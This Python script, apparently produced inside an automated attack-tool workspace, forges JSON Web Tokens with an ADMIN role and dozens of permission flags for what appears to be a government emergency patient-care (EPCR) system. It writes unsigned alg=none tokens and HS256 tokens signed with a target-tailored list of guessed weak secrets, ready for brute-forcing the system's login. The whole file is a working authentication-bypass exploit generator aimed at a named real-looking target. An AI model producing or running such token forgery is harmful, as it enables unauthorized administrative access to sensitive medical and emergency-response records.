import base64
import json
import hmac
import hashlib

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "HS256", "typ": "JWT"}

# 普通 payload 27 权限位
payload_basic = {
    "sub": "admin",
    "user": {"role": "ADMIN"},
    "permissions": [
        "EPCR_PAGE_RESOURCEMANAGEMENT","EPCR_PAGE_MONITOR","EPCR_PAGE_CASELIST",
        "EPCR_PAGE_OHCACASELIST","EPCR_PAGE_CHANGEHOS","EPCR_PAGE_MCILIST",
        "EPCR_PAGE_BRANCHGROUP","EPCR_PAGE_BRANCH","EPCR_PAGE_AMBULANCE",
        "EPCR_PAGE_EMT","EPCR_PAGE_HOSPITAL","EPCR_PAGE_DEVICE",
        "EPCR_PAGE_EMTLEVEL","EPCR_PAGE_EMTTRAINING","EPCR_PAGE_EMTTRAININGTYPE",
        "EPCR_PAGE_STAT","EPCR_PAGE_STAT_MANAGER","EPCR_PAGE_CASESIMULATOR",
        "HOSPITAL_PAGE_HOSPITALCAPABILITYLIST","EPCR_PAGE_SUPPLIES",
        "EPCR_PAGE_SUPPLIESCONFIG","EPCR_PAGE_SUPPLIESQUERY","EPCR_PAGE_SUPPLIESINVENTORY",
        "EPCR_PAGE_SUPPLIESSTOCKIN","EPCR_PAGE_SUPPLIESSTOCKOUT","EPCR_PAGE_SUPPLIESREQUEST",
        "EPCR_PAGE_SUPPLIESISSUANCE"
    ],
    "iat": 1700000000, "exp": 9999999999, "iss": "AuthServer"
}

# ADMIN 完整 payload 35 权限位
payload_admin = {
    "sub": "admin",
    "user": {"role": "ADMIN", "name": "admin", "branchId": 1},
    "permissions": ["AUTH_USER_ALL","AUTH_ROLE","AUTH_2FA","EPCR_CASE_SCORE","MONITOR_ALL",
                    "EPCR_PAGE_BACKTRACK_ADMIN",
                    "EPCR_PAGE_RESOURCEMANAGEMENT","EPCR_PAGE_MONITOR","EPCR_PAGE_CASELIST",
                    "EPCR_PAGE_OHCACASELIST","EPCR_PAGE_CHANGEHOS","EPCR_PAGE_MCILIST",
                    "EPCR_PAGE_BRANCHGROUP","EPCR_PAGE_BRANCH","EPCR_PAGE_AMBULANCE",
                    "EPCR_PAGE_EMT","EPCR_PAGE_HOSPITAL","EPCR_PAGE_DEVICE",
                    "EPCR_PAGE_EMTLEVEL","EPCR_PAGE_EMTTRAINING","EPCR_PAGE_EMTTRAININGTYPE",
                    "EPCR_PAGE_STAT","EPCR_PAGE_STAT_MANAGER","EPCR_PAGE_CASESIMULATOR",
                    "HOSPITAL_PAGE_HOSPITALCAPABILITYLIST","EPCR_PAGE_SUPPLIES",
                    "EPCR_PAGE_SUPPLIESCONFIG","EPCR_PAGE_SUPPLIESQUERY","EPCR_PAGE_SUPPLIESINVENTORY",
                    "EPCR_PAGE_SUPPLIESSTOCKIN","EPCR_PAGE_SUPPLIESSTOCKOUT","EPCR_PAGE_SUPPLIESREQUEST",
                    "EPCR_PAGE_SUPPLIESISSUANCE","EPCR_DOCTOR_ORDER"],
    "iat": 1700000000, "exp": 9999999999, "iss": "AuthServer"
}

weak_secrets = [
    "secret", "secret123", "password", "admin", "123456",
    "EPCR", "epcr", "tpf", "TPF", "viewlead", "EPCRServer",
    "EPCR_TPF_GOV_TW", "AuthServer", "3400", "8000",
    "epcr.tpf.gov.tw", "EPCR_KEY", "EP_SECRET", "EP_KEY",
    "epcr-secret", "epcr_secret", "epcr2020", "epcr2021",
    "epcr-admin", "tpf2020", "tpf123", "secretkey",
    "mysecret", "mykey", "my-secret", "my-key",
    "changeit", "12345", "qwerty", "abc123", "letmein",
    # 额外常见弱密钥
    "default", "test", "test123", "demo", "production",
    "express", "node", "nodejs", "express-jwt", "angular",
    "jwt", "jsonwebtoken", "hmac", "hash", "salt"
]

# 输出文件
with open("/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/jwt_basic_payload.txt","w") as f:
    h = b64url(json.dumps(header, separators=(',',':')).encode())
    p = b64url(json.dumps(payload_basic, separators=(',',':')).encode())
    f.write(f"{h}.{p}\n")

with open("/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/jwt_admin_payload.txt","w") as f:
    h = b64url(json.dumps(header, separators=(',',':')).encode())
    p = b64url(json.dumps(payload_admin, separators=(',',':')).encode())
    f.write(f"{h}.{p}\n")

# 完整 JWT 列表（含 alg=none + HS256 × 弱密钥 × 2 payload）
with open("/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/jwt_full_list.txt","w") as f:
    h_basic = b64url(json.dumps(header, separators=(',',':')).encode())
    p_basic = b64url(json.dumps(payload_basic, separators=(',',':')).encode())
    si_basic = f"{h_basic}.{p_basic}"
    f.write(f"alg=none_basic:{si_basic}.\n")
    
    h_admin = b64url(json.dumps(header, separators=(',',':')).encode())
    p_admin = b64url(json.dumps(payload_admin, separators=(',',':')).encode())
    si_admin = f"{h_admin}.{p_admin}"
    f.write(f"alg=none_admin:{si_admin}.\n")
    
    for secret in weak_secrets:
        sig_basic = b64url(hmac.new(secret.encode(), si_basic.encode(), hashlib.sha256).digest())
        sig_admin = b64url(hmac.new(secret.encode(), si_admin.encode(), hashlib.sha256).digest())
        f.write(f"HS256_basic[{secret}]:{si_basic}.{sig_basic}\n")
        f.write(f"HS256_admin[{secret}]:{si_admin}.{sig_admin}\n")

print(f"Total variants: 2 (alg=none) + {len(weak_secrets)*2} (HS256) = {2 + len(weak_secrets)*2}")
print(f"jwt_basic_payload.txt: 1 line")
print(f"jwt_admin_payload.txt: 1 line")
print(f"jwt_full_list.txt: {2 + len(weak_secrets)*2} lines")
